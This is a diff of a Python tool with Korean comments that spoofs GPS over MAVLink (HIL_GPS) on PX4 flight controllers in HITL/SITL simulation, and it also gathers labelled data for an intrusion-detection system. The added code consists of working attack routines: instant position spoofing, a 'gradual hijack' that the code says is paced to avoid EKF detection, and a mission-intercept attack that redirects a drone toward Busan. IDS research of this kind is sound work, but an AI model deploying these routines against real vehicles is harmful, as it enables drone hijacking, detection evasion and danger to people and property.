@@ -1,298 +1,489 @@
 #!/usr/bin/env python3
 """
-HITL UDP GPS 스푸핑 - 실제 플라이트 컨트롤러용
-PX4 v1.14 + X-Plane 12 환경
+HITL UDP GPS 스푸핑 - Windows 호환 권장 버전
+PX4 v1.14 + pymavlink 2.4.49 + X-Plane 12
+
+정상 미션 비행 중 GPS 스푸핑 주입 → 경로 이탈 시나리오
+IDS 학습용 데이터 수집 기능 포함
 """
 import os
 os.environ['MAVLINK20'] = '1'
 
 import time
 import math
+import sys
+import csv
 import threading
+from datetime import datetime
 from pymavlink import mavutil
 
-class HITLGPSSpoofer:
-    def __init__(self, connection_string='udpout:127.0.0.1:14550',
-                 source_system=1, source_component=191):
+class HITLUDPSpoofer:
+    def __init__(self, connection_string='udp:127.0.0.1:14557'):
         """
-        HITL 모드용 GPS 스푸퍼
+        HITL/SITL 양쪽 호환 UDP 스푸퍼
         
         Args:
-            connection_string: FC 연결 문자열
-            - USB: '/dev/ttyACM0' 또는 'COM3'
-            - UDP: 'udpout:127.0.0.1:14550'
+            connection_string: MAVLink 연결 문자열
+            - SITL: 'udp:127.0.0.1:14557' (기본 API 포트)
+            - HITL: 'udp:127.0.0.1:14550' 또는 시리얼 포트
         """
+        print(f"연결: {connection_string}")
+        
         self.master = mavutil.mavlink_connection(
             connection_string,
-            source_system=source_system,
-            source_component=source_component
+            source_system=255,
+            source_component=190
         )
+        
         self.boot_time = time.time()
         self.running = False
-        self.current_spoof_pos = None
-        self.gps_thread = None
+        self.spoof_thread = None
+        self.current_spoof = None
+        self.data_log = []
         
-    def wait_heartbeat(self):
-        print("플라이트 컨트롤러 연결 대기...")
-        self.master.wait_heartbeat()
-        print(f"연결됨 System: {self.master.target_system}")
+    def wait_heartbeat(self, timeout=30):
+        """하트비트 대기 및 연결 확인"""
+        print(f"하트비트 대기 중... (최대 {timeout}초)")
         
-    def check_hitl_params(self):
-        """HITL 파라미터 확인"""
-        # MAV_USEHILGPS 파라미터 요청
-        self.master.mav.param_request_read_send(
-            self.master.target_system,
-            self.master.target_component,
-            b'MAV_USEHILGPS',
-            -1
-        )
-        
-        msg = self.master.recv_match(type='PARAM_VALUE', blocking=True, timeout=3)
-        if msg and msg.param_id == 'MAV_USEHILGPS':
-            if msg.param_value == 0:
-                print("경고: MAV_USEHILGPS=0. GPS 스푸핑이 작동하지 않을 수 있습니다.")
-                print("설정 명령: param set MAV_USEHILGPS 1")
-            else:
-                print("MAV_USEHILGPS=1 확인됨")
+        start = time.time()
+        while (time.time() - start) < timeout:
+            try:
+                msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
+                if msg:
+                    print(f"연결됨! System: {msg.get_srcSystem()}, Type: {msg.type}")
+                    return True
+            except Exception as e:
+                print(f"수신 오류: {e}")
+                time.sleep(0.5)
                 
-    def get_timestamp_us(self):
-        """안전한 uint64 타임스탬프"""
-        return int((time.time() - self.boot_time) * 1e6) & 0xFFFFFFFFFFFFFFFF
+        print("타임아웃: 하트비트 없음")
+        return False
+        
+    def get_safe_timestamp_us(self):
+        """uint64 범위 내 안전한 타임스탬프"""
+        elapsed = time.time() - self.boot_time
+        return int(elapsed * 1e6) & 0xFFFFFFFFFFFFFFFF
         
     def send_hil_gps(self, lat_deg, lon_deg, alt_m,
                      vn_ms=0.0, ve_ms=0.0, vd_ms=0.0,
-                     fix_type=3, satellites=12, hdop=1.0, vdop=1.0):
+                     fix_type=3, satellites=12,
+                     hdop=1.0, vdop=1.0):
         """
-        완전한 HIL_GPS 메시지 송신
-        
-        모든 파라미터 범위 검증 포함 (struct.error 방지)
+        완전한 HIL_GPS 메시지 전송
+        모든 파라미터 범위 검증 포함
         """
-        # 범위 검증 및 변환
+        # 단위 변환 및 범위 제한
         lat_e7 = max(-900000000, min(900000000, int(lat_deg * 1e7)))
         lon_e7 = max(-1800000000, min(1800000000, int(lon_deg * 1e7)))
         alt_mm = max(-1000000000, min(1000000000, int(alt_m * 1000)))
         
-        # 속도 변환 (m/s → cm/s), int16 범위 제한
+        # 속도 (m/s → cm/s, int16 범위)
         vn_cms = max(-32768, min(32767, int(vn_ms * 100)))
         ve_cms = max(-32768, min(32767, int(ve_ms * 100)))
         vd_cms = max(-32768, min(32767, int(vd_ms * 100)))
         
-        # 지상 속도 (uint16)
+        # 지상속도 (uint16)
         ground_speed = math.sqrt(vn_ms**2 + ve_ms**2)
         vel_cms = max(0, min(65535, int(ground_speed * 100)))
         
-        # DOP (uint16, *100)
+        # DOP (uint16)
         eph = max(0, min(65535, int(hdop * 100)))
         epv = max(0, min(65535, int(vdop * 100)))
         
-        # 진행 방향 (cdeg, 0-35999)
+        # 진행방향 (cdeg, 0-35999)
         if ground_speed > 0.1:
-            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100) % 36000
+            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100)
+            if cog < 0:
+                cog += 36000
+            cog = cog % 36000
         else:
             cog = 0
             
-        self.master.mav.hil_gps_send(
-            self.get_timestamp_us(),
-            fix_type,
-            lat_e7,
-            lon_e7,
-            alt_mm,
-            eph,
-            epv,
-            vel_cms,
-            vn_cms,
-            ve_cms,
-            vd_cms,
-            cog,
-            satellites
+        try:
+            self.master.mav.hil_gps_send(
+                self.get_safe_timestamp_us(),
+                fix_type,
+                lat_e7, lon_e7, alt_mm,
+                eph, epv,
+                vel_cms,
+                vn_cms, ve_cms, vd_cms,
+                cog,
+                satellites
+            )
+            return True
+        except Exception as e:
+            print(f"HIL_GPS 오류: {e}")
+            return False
+            
+    def get_current_position(self, timeout=5):
+        """현재 드론 위치 획득"""
+        start = time.time()
+        while (time.time() - start) < timeout:
+            msg = self.master.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1)
+            if msg:
+                return {
+                    'lat': msg.lat / 1e7,
+                    'lon': msg.lon / 1e7,
+                    'alt': msg.alt / 1000,
+                    'relative_alt': msg.relative_alt / 1000,
+                    'vx': msg.vx / 100,
+                    'vy': msg.vy / 100,
+                    'vz': msg.vz / 100
+                }
+        return None
+        
+    def set_mode_offboard(self):
+        """Offboard 모드로 전환 (PX4)"""
+        print("Offboard 모드 전환 시도...")
+        
+        # MAV_CMD_DO_SET_MODE
+        self.master.mav.command_long_send(
+            self.master.target_system,
+            self.master.target_component,
+            mavutil.mavlink.MAV_CMD_DO_SET_MODE,
+            0,  # confirmation
+            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+            6,  # PX4_CUSTOM_MAIN_MODE_OFFBOARD
+            0, 0, 0, 0, 0
         )
         
-    def _gps_stream_thread(self, rate_hz):
-        """백그라운드 GPS 스트림 스레드"""
+        # 결과 대기
+        msg = self.master.recv_match(type='COMMAND_ACK', blocking=True, timeout=3)
+        if msg and msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
+            print("Offboard 모드 전환 성공")
+            return True
+        else:
+            print("Offboard 모드 전환 실패 (정상 - SITL에서는 무시 가능)")
+            return False
+            
+    def _spoof_thread_func(self, rate_hz):
+        """백그라운드 GPS 스푸핑 스레드"""
         interval = 1.0 / rate_hz
-        while self.running:
-            if self.current_spoof_pos:
-                lat, lon, alt = self.current_spoof_pos
-                self.send_hil_gps(lat, lon, alt)
+        
+        while self.running and self.current_spoof:
+            lat, lon, alt = self.current_spoof
+            self.send_hil_gps(lat, lon, alt)
             time.sleep(interval)
             
-    def start_gps_stream(self, lat, lon, alt, rate_hz=50):
-        """
-        백그라운드 GPS 스트림 시작
-        
-        Args:
-            rate_hz: 전송 빈도 (권장: 40-70Hz)
-        """
-        self.current_spoof_pos = (lat, lon, alt)
+    def start_continuous_spoof(self, lat, lon, alt, rate_hz=50):
+        """연속 GPS 스푸핑 시작"""
+        self.current_spoof = (lat, lon, alt)
         self.running = True
-        self.gps_thread = threading.Thread(
-            target=self._gps_stream_thread,
+        
+        self.spoof_thread = threading.Thread(
+            target=self._spoof_thread_func,
             args=(rate_hz,),
             daemon=True
         )
-        self.gps_thread.start()
-        print(f"GPS 스트림 시작: {rate_hz}Hz")
+        self.spoof_thread.start()
+        print(f"연속 스푸핑 시작: {lat:.6f}, {lon:.6f}, {alt:.1f}m @ {rate_hz}Hz")
         
     def update_spoof_position(self, lat, lon, alt):
-        """실시간 스푸핑 위치 업데이트"""
-        self.current_spoof_pos = (lat, lon, alt)
+        """스푸핑 위치 실시간 업데이트"""
+        self.current_spoof = (lat, lon, alt)
         
-    def stop_gps_stream(self):
-        """GPS 스트림 중지"""
+    def stop_continuous_spoof(self):
+        """연속 스푸핑 중지"""
         self.running = False
-        if self.gps_thread:
-            self.gps_thread.join(timeout=2)
-        print("GPS 스트림 중지됨")
+        if self.spoof_thread:
+            self.spoof_thread.join(timeout=2)
+        self.current_spoof = None
+        print("스푸핑 중지됨")
         
-    def mission_intercept_spoof(self, intercept_lat, intercept_lon, 
-                                redirect_lat, redirect_lon,
-                                redirect_alt=50.0,
-                                detection_radius_m=50.0):
+    def gradual_hijack(self, target_lat, target_lon, target_alt,
+                       duration_s=30, rate_hz=50):
         """
-        미션 비행 중 GPS 스푸핑 시나리오
+        점진적 경로 납치 (현재 위치에서 시작)
         
-        드론이 특정 위치에 도달하면 가짜 위치로 리디렉션
+        EKF 탐지를 피하기 위해 천천히 위치를 이동
         """
-        print(f"가로채기 위치: {intercept_lat}, {intercept_lon}")
-        print(f"리디렉션 위치: {redirect_lat}, {redirect_lon}")
-        print("드론 위치 모니터링 중...")
+        print("\n=== 점진적 GPS 납치 시작 ===")
         
-        # 정상 GPS 스트림 시작 (오프셋 없음)
-        self.start_gps_stream(intercept_lat, intercept_lon, redirect_alt, rate_hz=50)
+        # 현재 위치 획득
+        current = self.get_current_position()
+        if not current:
+            print("현재 위치 획득 실패")
+            return False
+            
+        start_lat = current['lat']
+        start_lon = current['lon']
+        start_alt = current['alt']
         
-        while True:
-            # 현재 드론 위치 수신
-            msg = self.master.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1)
-            if not msg:
-                continue
-                
-            drone_lat = msg.lat / 1e7
-            drone_lon = msg.lon / 1e7
-            
-            # 거리 계산 (간단한 근사)
-            dlat = (drone_lat - intercept_lat) * 111320
-            dlon = (drone_lon - intercept_lon) * 111320 * math.cos(math.radians(drone_lat))
-            distance = math.sqrt(dlat**2 + dlon**2)
-            
-            if distance < detection_radius_m:
-                print(f"가로채기 지점 도달! 거리: {distance:.1f}m")
-                print("점진적 리디렉션 시작...")
-                
-                # 점진적 스푸핑 (30초에 걸쳐)
-                steps = 300
-                for i in range(steps):
-                    progress = i / steps
-                    new_lat = drone_lat + (redirect_lat - drone_lat) * progress
-                    new_lon = drone_lon + (redirect_lon - drone_lon) * progress
-                    self.update_spoof_position(new_lat, new_lon, redirect_alt)
-                    time.sleep(0.1)
-                    
-                print("리디렉션 완료!")
+        print(f"현재: {start_lat:.6f}, {start_lon:.6f}, {start_alt:.1f}m")
+        print(f"목표: {target_lat:.6f}, {target_lon:.6f}, {target_alt:.1f}m")
+        print(f"소요시간: {duration_s}초")
+        
+        steps = int(duration_s * rate_hz)
+        interval = 1.0 / rate_hz
+        
+        for i in range(steps + 1):
+            if not self.running:
                 break
                 
-            time.sleep(0.5)
+            progress = i / steps
             
-    def data_collection_mode(self, duration_s=300, output_file='gps_spoof_data.csv'):
-        """
-        IDS 학습용 데이터 수집 모드
+            # S-curve 보간 (더 자연스러운 이동)
+            smooth_progress = (1 - math.cos(progress * math.pi)) / 2
+            
+            lat = start_lat + (target_lat - start_lat) * smooth_progress
+            lon = start_lon + (target_lon - start_lon) * smooth_progress
+            alt = start_alt + (target_alt - start_alt) * smooth_progress
+            
+            # 속도 계산 (이전 위치와의 차이)
+            if i > 0:
+                dlat = (target_lat - start_lat) * smooth_progress / duration_s
+                dlon = (target_lon - start_lon) * smooth_progress / duration_s
+                vn = dlat * 111320
+                ve = dlon * 111320 * math.cos(math.radians(lat))
+            else:
+                vn, ve = 0, 0
+                
+            self.send_hil_gps(lat, lon, alt, vn_ms=vn, ve_ms=ve)
+            
+            # 데이터 로깅
+            self.data_log.append({
+                'timestamp': time.time(),
+                'progress': progress,
+                'spoof_lat': lat,
+                'spoof_lon': lon,
+                'spoof_alt': alt
+            })
+            
+            # 진행 상황 (10% 단위)
+            if i % max(1, steps // 10) == 0:
+                print(f"[{progress*100:5.1f}%] {lat:.6f}, {lon:.6f}, {alt:.1f}m")
+                
+            time.sleep(interval)
+            
+        print("납치 완료!")
+        return True
         
-        정상 및 스푸핑 GPS 데이터를 CSV로 저장
+    def mission_intercept_attack(self, intercept_lat, intercept_lon,
+                                  redirect_lat, redirect_lon, redirect_alt,
+                                  detection_radius_m=100):
         """
-        import csv
+        미션 비행 중 가로채기 공격
         
-        print(f"데이터 수집 시작: {duration_s}초, 출력: {output_file}")
+        드론이 특정 위치에 도달하면 GPS 스푸핑으로 경로 변경
+        """
+        print("\n=== 미션 가로채기 공격 ===")
+        print(f"가로채기 지점: {intercept_lat:.6f}, {intercept_lon:.6f}")
+        print(f"리디렉션 목표: {redirect_lat:.6f}, {redirect_lon:.6f}")
+        print(f"탐지 반경: {detection_radius_m}m")
+        print("\n드론 위치 모니터링 중... (Ctrl+C로 중단)")
+        
+        self.running = True
+        
+        try:
+            while self.running:
+                pos = self.get_current_position(timeout=2)
+                if not pos:
+                    continue
+                    
+                # 거리 계산
+                dlat = (pos['lat'] - intercept_lat) * 111320
+                dlon = (pos['lon'] - intercept_lon) * 111320 * math.cos(math.radians(pos['lat']))
+                distance = math.sqrt(dlat**2 + dlon**2)
+                
+                print(f"\r거리: {distance:.1f}m | 위치: {pos['lat']:.6f}, {pos['lon']:.6f}", end='')
+                
+                if distance < detection_radius_m:
+                    print(f"\n\n가로채기 지점 도달! 공격 시작...")
+                    
+                    # 점진적 납치
+                    self.gradual_hijack(
+                        redirect_lat, redirect_lon, redirect_alt,
+                        duration_s=30,
+                        rate_hz=50
+                    )
+                    break
+                    
+                time.sleep(0.5)
+                
+        except KeyboardInterrupt:
+            print("\n\n사용자 중단")
+            
+        self.running = False
+        
+    def collect_ids_data(self, output_file, duration_s=300, spoof_start_pct=50):
+        """
+        IDS 학습용 데이터 수집
+        
+        Args:
+            output_file: CSV 출력 파일
+            duration_s: 총 수집 시간 (초)
+            spoof_start_pct: 스푸핑 시작 시점 (%)
+        """
+        print(f"\n=== IDS 데이터 수집 ===")
+        print(f"출력: {output_file}")
+        print(f"시간: {duration_s}초")
+        print(f"스푸핑 시작: {spoof_start_pct}% 지점")
         
         with open(output_file, 'w', newline='') as f:
             writer = csv.writer(f)
             writer.writerow([
                 'timestamp', 'label',
-                'lat', 'lon', 'alt',
-                'vn', 've', 'vd',
-                'hdop', 'satellites',
-                'spoof_lat', 'spoof_lon', 'spoof_alt'
+                'real_lat', 'real_lon', 'real_alt',
+                'real_vx', 'real_vy', 'real_vz',
+                'spoof_lat', 'spoof_lon', 'spoof_alt',
+                'offset_m'
             ])
             
             start_time = time.time()
             spoof_active = False
+            spoof_pos = None
+            sample_count = 0
             
             while (time.time() - start_time) < duration_s:
                 elapsed = time.time() - start_time
+                progress = (elapsed / duration_s) * 100
                 
-                # 50% 지점에서 스푸핑 시작
-                if elapsed > duration_s * 0.5 and not spoof_active:
+                # 스푸핑 시작 조건
+                if progress >= spoof_start_pct and not spoof_active:
                     spoof_active = True
-                    print("스푸핑 활성화!")
-                    self.start_gps_stream(37.0, 127.0, 100.0)
-                    
-                msg = self.master.recv_match(type='GPS_RAW_INT', blocking=True, timeout=1)
-                if msg:
-                    spoof_pos = self.current_spoof_pos or (0, 0, 0)
+                    pos = self.get_current_position(timeout=1)
+                    if pos:
+                        # 500m 오프셋
+                        spoof_pos = (pos['lat'] + 0.0045, pos['lon'] + 0.0045, pos['alt'])
+                        self.start_continuous_spoof(*spoof_pos, rate_hz=50)
+                        print(f"\n[{elapsed:.1f}s] 스푸핑 활성화!")
+                        
+                # 데이터 샘플링
+                pos = self.get_current_position(timeout=0.5)
+                if pos:
+                    if spoof_active and spoof_pos:
+                        offset = math.sqrt(
+                            ((pos['lat'] - spoof_pos[0]) * 111320)**2 +
+                            ((pos['lon'] - spoof_pos[1]) * 111320 * math.cos(math.radians(pos['lat'])))**2
+                        )
+                    else:
+                        offset = 0
+                        spoof_pos = (0, 0, 0)
+                        
                     writer.writerow([
                         time.time(),
                         'spoofed' if spoof_active else 'normal',
-                        msg.lat / 1e7, msg.lon / 1e7, msg.alt / 1000,
-                        0, 0, 0,  # 속도 (별도 메시지에서)
-                        msg.eph / 100, msg.satellites_visible,
-                        spoof_pos[0], spoof_pos[1], spoof_pos[2]
+                        pos['lat'], pos['lon'], pos['alt'],
+                        pos['vx'], pos['vy'], pos['vz'],
+                        spoof_pos[0], spoof_pos[1], spoof_pos[2],
+                        offset
                     ])
+                    sample_count += 1
                     
-        self.stop_gps_stream()
-        print(f"데이터 저장 완료: {output_file}")
+                    if sample_count % 50 == 0:
+                        label = 'SPOOF' if spoof_active else 'NORMAL'
+                        print(f"\r[{elapsed:.1f}s] {label} | 샘플: {sample_count}", end='')
+                        
+        self.stop_continuous_spoof()
+        print(f"\n\n데이터 수집 완료: {sample_count}개 샘플 → {output_file}")
+
 
 def main():
-    print("=== HITL UDP GPS 스푸핑 (권장 모드) ===")
+    print("=" * 60)
+    print("HITL/SITL UDP GPS 스푸핑 - Windows 호환")
+    print("PX4 v1.14 + X-Plane 12 + pymavlink 2.4.49")
+    print("=" * 60)
     print()
-    print("사전 설정:")
-    print("  FC 콘솔에서: param set MAV_USEHILGPS 1")
-    print("  또는 HITL 모드: param set SYS_HITL 1")
+    
+    print("연결 설정:")
+    print("  1. SITL (udp:127.0.0.1:14557)")
+    print("  2. HITL/QGC (udp:127.0.0.1:14550)")
+    print("  3. 사용자 정의")
+    
+    conn_choice = input("\n선택 (1-3, 기본=1): ").strip() or '1'
+    
+    if conn_choice == '1':
+        conn_str = 'udp:127.0.0.1:14557'
+    elif conn_choice == '2':
+        conn_str = 'udp:127.0.0.1:14550'
+    else:
+        conn_str = input("연결 문자열: ").strip()
+        
     print()
     
-    # USB 직접 연결 예시
-    # spoofer = HITLGPSSpoofer('/dev/ttyACM0', baud=57600)
+    try:
+        spoofer = HITLUDPSpoofer(connection_string=conn_str)
+    except Exception as e:
+        print(f"연결 생성 실패: {e}")
+        sys.exit(1)
+        
+    if not spoofer.wait_heartbeat(timeout=30):
+        print("\n연결 실패. 확인 사항:")
+        print("  1. PX4 SITL/HITL 실행 중?")
+        print("  2. MAVLink 포트 올바른가?")
+        print("  3. 방화벽 설정?")
+        sys.exit(1)
+        
+    print("\n=== 공격 모드 선택 ===")
+    print("1. 즉시 고정 위치 스푸핑")
+    print("2. 점진적 경로 납치")
+    print("3. 미션 가로채기 공격")
+    print("4. IDS 데이터 수집")
     
-    # UDP 연결 (mavlink-router 통해)
-    spoofer = HITLGPSSpoofer('udpout:127.0.0.1:14550')
-    spoofer.wait_heartbeat()
-    spoofer.check_hitl_params()
+    mode = input("\n선택 (1-4): ").strip()
     
-    print("\n모드 선택:")
-    print("1. 기본 GPS 스푸핑")
-    print("2. 미션 가로채기 스푸핑")
-    print("3. IDS 데이터 수집")
-    
-    mode = input("선택 (1-3): ").strip()
+    # 목표 위치 (부산)
+    BUSAN = (35.1796, 129.0756, 100.0)
     
     if mode == '1':
-        # 기본 스푸핑
-        spoofer.start_gps_stream(
-            lat=35.1796,   # 부산
-            lon=129.0756,
-            alt=100.0,
-            rate_hz=50
-        )
-        print("Ctrl+C로 종료")
+        # 즉시 스푸핑
+        lat = float(input(f"목표 위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
+        lon = float(input(f"목표 경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
+        alt = float(input(f"목표 고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
+        duration = int(input("지속시간 초 (기본=120): ").strip() or '120')
+        
+        spoofer.running = True
+        spoofer.start_continuous_spoof(lat, lon, alt, rate_hz=50)
+        
+        print(f"\n{duration}초 동안 스푸핑 진행 중... (Ctrl+C로 중단)")
         try:
-            while True:
-                time.sleep(1)
+            time.sleep(duration)
         except KeyboardInterrupt:
-            spoofer.stop_gps_stream()
+            pass
             
+        spoofer.stop_continuous_spoof()
+        
     elif mode == '2':
-        # 미션 가로채기
-        spoofer.mission_intercept_spoof(
-            intercept_lat=37.5665,    # 서울 (가로채기 지점)
-            intercept_lon=126.9780,
-            redirect_lat=35.1796,      # 부산 (리디렉션 목표)
-            redirect_lon=129.0756,
-            redirect_alt=50.0
-        )
+        # 점진적 납치
+        lat = float(input(f"목표 위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
+        lon = float(input(f"목표 경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
+        alt = float(input(f"목표 고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
+        duration = int(input("납치 소요시간 초 (기본=60): ").strip() or '60')
+        
+        spoofer.running = True
+        spoofer.gradual_hijack(lat, lon, alt, duration_s=duration, rate_hz=50)
         
     elif mode == '3':
-        # 데이터 수집
-        spoofer.data_collection_mode(
-            duration_s=600,
-            output_file='gps_ids_training_data.csv'
+        # 미션 가로채기
+        print("\n가로채기 지점 (드론이 이 위치에 도달하면 공격 시작)")
+        int_lat = float(input("위도: "))
+        int_lon = float(input("경도: "))
+        
+        print("\n리디렉션 목표")
+        red_lat = float(input(f"위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
+        red_lon = float(input(f"경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
+        red_alt = float(input(f"고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
+        
+        spoofer.mission_intercept_attack(
+            int_lat, int_lon,
+            red_lat, red_lon, red_alt,
+            detection_radius_m=100
         )
+        
+    elif mode == '4':
+        # IDS 데이터 수집
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        output = f"gps_ids_data_{timestamp}.csv"
+        duration = int(input("수집 시간 초 (기본=300): ").strip() or '300')
+        
+        spoofer.running = True
+        spoofer.collect_ids_data(output, duration_s=duration)
+        
+    else:
+        print("잘못된 선택")
+        
+    print("\n프로그램 종료")
+
 
 if __name__ == "__main__":
     main()
